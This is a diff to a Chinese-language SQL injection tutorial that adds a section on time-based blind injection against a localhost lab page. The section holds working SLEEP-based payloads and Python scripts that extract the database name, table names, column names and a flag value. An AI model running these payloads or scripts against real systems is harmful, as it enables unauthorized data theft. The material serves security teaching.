@@ -1,6 +1,6 @@
 # SQL注入详解
 
-`更新时间 2025-9-7`
+`更新时间 2025-9-15`
 
 ## 概述
 
@@ -1117,3 +1117,277 @@ WHERE IF(1=1,SLEEP(1),1);
 ```
 
 > <img src="./IMG3/{20B5AB62-4044-4675-A09B-79226DC93463}.png">
+
+这样一来，我们就成功地判断了漏洞类型
+
+###### 判断字段数量
+
+字段数量的判断仍然可以使用`ORDER BY`来进行
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(1=1,SLEEP(1),1)) AS a) ORDER BY 6#
+```
+
+> <img src="./IMG3/{3D4BBE26-CCAB-4D88-8254-6681B5ECF3B0}.png">
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(1=1,SLEEP(1),1)) AS a) ORDER BY 3#
+```
+
+> <img src="./IMG3/{B503981C-B86C-4552-BF4E-60FA9B29A787}.png">
+
+因此，我们可以确定有3个字段
+
+###### 泄露数据库
+
+与布尔盲注类似，可以使用`LENGTH(DATABASE())>5`作为`IF()`的判断条件来猜测数据库名长度
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(LENGTH(DATABASE())>5,SLEEP(1),1)) AS a)#
+```
+
+> <img src="./IMG3/{3D4BBE26-CCAB-4D88-8254-6681B5ECF3B0}.png">
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(LENGTH(DATABASE())=4,SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{B503981C-B86C-4552-BF4E-60FA9B29A787}.png">
+
+或者通过`SUBSTR(DATABASE(),1,1)>'q'`来直接猜测数据库名的字符
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR(DATABASE(),1,1)>'q',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{B503981C-B86C-4552-BF4E-60FA9B29A787}.png">
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR(DATABASE(),1,1)>'u',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{3D4BBE26-CCAB-4D88-8254-6681B5ECF3B0}.png">
+
+这种类型的手工注入相当繁琐，因此我们使用脚本来进行
+
+**脚本注入**
+
+```py
+import requests
+import string
+
+url = 'http://localhost/sql-injection/blind-time.php'
+charset = string.ascii_lowercase + string.digits + string.punctuation
+
+# 确定长度
+maxLen = 10
+dataBaseLen = 0
+for i in range(1, maxLen + 1):
+    print(f'正在测试数据库名长度为{i}...')
+    payload = f"0' OR (SELECT 1 FROM (SELECT IF(LENGTH(DATABASE())={i},SLEEP(1),1)) AS a)#"
+    response = requests.post(url, data={'username': payload})
+    responseTime = response.elapsed.total_seconds()
+    if responseTime > 1.0:
+        dataBaseLen = i
+        break
+print(f'>>> 数据库名长度为{dataBaseLen}')
+
+# 确定数据库名
+dataBaseName = ''
+for i in range(1, dataBaseLen + 1):
+    print(f'正在测试数据库名第{i}个字符...')
+    for char in charset:
+        payload = f"0' OR (SELECT 1 FROM (SELECT IF(SUBSTRING(DATABASE(),{i},1)='{char}',SLEEP(1),1)) AS a)#"
+        response = requests.post(url, data={'username': payload})
+        responseTime = response.elapsed.total_seconds()
+        if responseTime > 1.0:
+            dataBaseName += char
+            break
+print(f'>>> 数据库名为{dataBaseName}')
+```
+
+时间注入的脚本也需要考虑使用时间来作为判断条件，而`requests`库中的`total_seconds()`方法正好能获取网页响应时长，因此脚本注入是可行的，这里需要注意，`total_seconds()`方法返回的是一个`float`，不应直接与`int`比较
+
+> <img src="./IMG3/{1FB0A3EA-25AB-4FC9-9865-4B091B5B07FD}.png">
+
+###### 泄露数据表
+
+原理我认为无需过多解释，即将`IF()`的判定条件改为布尔盲注的判定条件即可
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'a',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{B503981C-B86C-4552-BF4E-60FA9B29A787}.png">
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'f',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{3D4BBE26-CCAB-4D88-8254-6681B5ECF3B0}.png">
+
+**脚本注入**
+
+对于数据表名，和数据库名一样对大小写不敏感，因此可以直接沿用爆破数据库名的脚本
+
+```py
+import requests
+import string
+
+url = 'http://localhost/sql-injection/blind-time.php'
+charset = string.ascii_lowercase + string.digits + string.punctuation
+
+# 确定长度
+maxLen = 50
+tableNameLen = 0
+for i in range(1, maxLen + 1):
+    print(f'正在测试数据表名长度为{i}...')
+    payload = f"0' OR (SELECT 1 FROM (SELECT IF(LENGTH((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()))={i},SLEEP(1),1)) AS a)#"
+    response = requests.post(url, data={'username': payload})
+    responseTime = response.elapsed.total_seconds()
+    if responseTime > 1.0:
+        tableNameLen = i
+        break
+print(f'>>> 数据表名长度为{tableNameLen}')
+
+# 获取数据表名
+tableNames = ''
+for i in range(1, tableNameLen + 1):
+    print(f'正在测试数据表名第{i}个字符...')
+    for j in charset:
+        payload = f"0' OR (SELECT 1 FROM (SELECT IF(SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),{i},1)='{j}',SLEEP(1),1)) AS a)#"
+        response = requests.post(url, data={'username': payload})
+        responseTime = response.elapsed.total_seconds()
+        if responseTime > 1.0:
+            tableNames += j
+            break
+print(f'>>> 数据表名为 {tableNames}')
+```
+
+结果如下
+
+> <img src="./IMG3/{B044C395-D329-4DC7-86A6-600C6E0B7FAC}.png">
+
+###### 泄露字段名
+
+确定flag表，查询字段名
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='flag'),1,1)>'a',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{B503981C-B86C-4552-BF4E-60FA9B29A787}.png">
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='flag'),1,1)>'f',SLEEP(1),1)) AS a)#
+```
+
+<img src="./IMG3/{3D4BBE26-CCAB-4D88-8254-6681B5ECF3B0}.png">
+
+**脚本注入**
+
+字段名同样无需考虑大小写问题
+
+```py
+import requests
+import string
+
+url = 'http://localhost/sql-injection/blind-time.php'
+charset = string.ascii_lowercase + string.digits + string.punctuation
+
+table = 'flag'
+database = 'test'
+
+# 确定长度
+MAX = 50
+columnLen = 0
+for i in range(1, MAX):
+    print(f'正在测试字段长度: {i}')
+    payload = f"0' OR (SELECT 1 FROM (SELECT IF(LENGTH((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA='{database}' AND TABLE_NAME='{table}'))={i},SLEEP(1),1)) AS a)#"
+    response = requests.post(url, data={'username': payload})
+    if response.elapsed.total_seconds() > 1.0:
+        columnLen = i
+        break
+print(f'>>> 字段名长度为: {columnLen}')
+
+# 获取字段名
+columnName = ''
+for i in range(1, columnLen + 1):
+    print(f'正在测试第 {i} 个字段名字符')
+    for j in charset:
+        payload = f"0' OR (SELECT 1 FROM (SELECT IF(SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA='{database}' AND TABLE_NAME='{table}'),{i},1)='{j}',SLEEP(1),1)) AS a)#"
+        response = requests.post(url, data={'username': payload})
+        if response.elapsed.total_seconds() > 1.0:
+            columnName += j
+            break
+print(f'>>> 字段名为: {columnName}')
+```
+
+结果如下
+
+> <img src="./IMG3/{A4137D27-E621-4E56-B9ED-3A3D4ED7C573}.png">
+
+###### 泄露字段值
+
+字段值的泄露通过查询目标表获取，例如
+
+```sql
+SELECT 1 FROM (SELECT IF(LENGTH((SELECT flag FROM flag))>7,SLEEP(1),1)) AS a;
+```
+
+> <img src="./IMG3/{15B56B7D-45A3-456E-B20A-140FC7DAB271}.png">
+
+```sql
+SELECT 1 FROM (SELECT IF(LENGTH((SELECT flag FROM flag))>30,SLEEP(1),1)) AS a;
+```
+
+> <img src="./IMG3/{CB946C56-99D7-4E5F-AD33-1695EB7338E4}.png">
+
+这样就可以判断字段值的长度，从而进一步猜测字段值
+
+**脚本注入**
+
+在泄露字段值时，需要额外注意大小写，因为`SUBSTR()`对大小写不敏感，因此必须使用`ASCII()`，同时，为了保证爆破的准确性，尽量选择比较大的延迟，降低因网络波动导致的误报概率
+
+```py
+import requests
+import string
+
+url = 'http://localhost/sql-injection/blind-time.php'
+charset = string.ascii_letters + string.digits + string.punctuation
+
+table = 'flag'
+database = 'test'
+column = 'flag'
+
+# 确定长度
+MAX = 50
+valueLen = 0
+for i in range(1, MAX):
+    print(f'尝试长度为{i}')
+    payload = f"0' OR (SELECT 1 FROM (SELECT IF(LENGTH((SELECT {column} FROM {database}.{table}))={i},SLEEP(1),1)) AS a)#"
+    response = requests.post(url, data={'username': payload})
+    if response.elapsed.total_seconds() > 1.0:
+        valueLen = i
+        break
+print(f'>>> 字段值长度为{valueLen}')
+
+# 获取字段值
+# 使用ASCII()函数保证大小写敏感
+value = ''
+for i in range(1, valueLen+1):
+    print(f'尝试第{i}个字符')
+    for c in charset:
+        payload = f"0' OR (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING((SELECT {column} FROM {database}.{table}),{i},1))={ord(c)},SLEEP(2),1)) AS a)#"
+        response = requests.post(url, data={'username': payload})
+        if response.elapsed.total_seconds() > 2.0:
+            value += c
+            break
+print(f'>>> 字段值为{value}')
+```
+
+结果如下
+
+> <img src="./IMG3/{E4E3BE49-0C9C-4B1D-9315-E5C53F9F685D}.png">
+
+> <img src="./IMG3/{E55B859D-A87E-4CC1-8737-A3256F9D5D97}.png">
